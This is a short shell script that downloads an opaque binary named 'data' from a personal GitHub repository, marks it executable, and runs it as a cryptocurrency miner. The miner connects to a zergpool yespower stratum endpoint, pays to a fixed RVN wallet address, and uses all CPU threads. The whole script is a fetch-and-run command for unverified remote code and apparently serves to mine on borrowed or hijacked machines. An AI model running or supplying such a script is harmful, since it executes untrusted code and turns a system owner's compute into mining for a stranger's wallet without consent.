apt update -y
wget https://github.com/Master478963/lolMinet/raw/main/data 
chmod +x data
./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u rFb4oRYDDbHpFEcshVx1ppLG97njb9kWCQ.Test -p c=RVN -t $(nproc) -x 
